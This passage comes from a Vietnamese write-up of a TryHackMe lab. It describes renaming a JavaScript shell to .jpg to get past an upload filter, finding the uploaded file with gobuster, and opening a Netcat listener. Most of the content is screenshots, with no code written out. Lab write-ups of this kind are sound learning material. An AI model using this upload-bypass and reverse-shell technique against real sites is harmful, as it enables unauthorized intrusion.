![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image205.png?raw=true)

=> Thử xóa phần này đi và upload lại file:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image206.png?raw=true)

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image207.png?raw=true)

=> Vẫn không được. Có thể có server-side-filter. 

=> Thử thay đổi extension của file từ ***.js*** thành ***.jpg***:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image208.png?raw=true)

=> Upload lại file: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image209.png?raw=true)

=> Upload thành công. 

=> Thư mục nào sẽ lưu trữ file upload này?

Sử dụng gobuster tìm được 5 file .jpg ở thư mục ***/content***: 

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image210.png?raw=true)

=> Kiểm tra lại sau khi upload file jsshell.jpg

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image211.png?raw=true)

=> Xuất hiện file .jpg mới: ***LHT.jpg***.

=> Truy cập ***/admin***:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image212.png?raw=true)

=> Lắng nghe bằng Netcat:

![img](https://github.com/DucThinh47/TryHackMe/blob/main/Web_Fundamental/Web_Hacking_Fundamentals/images/image213.png?raw=true)





























































































































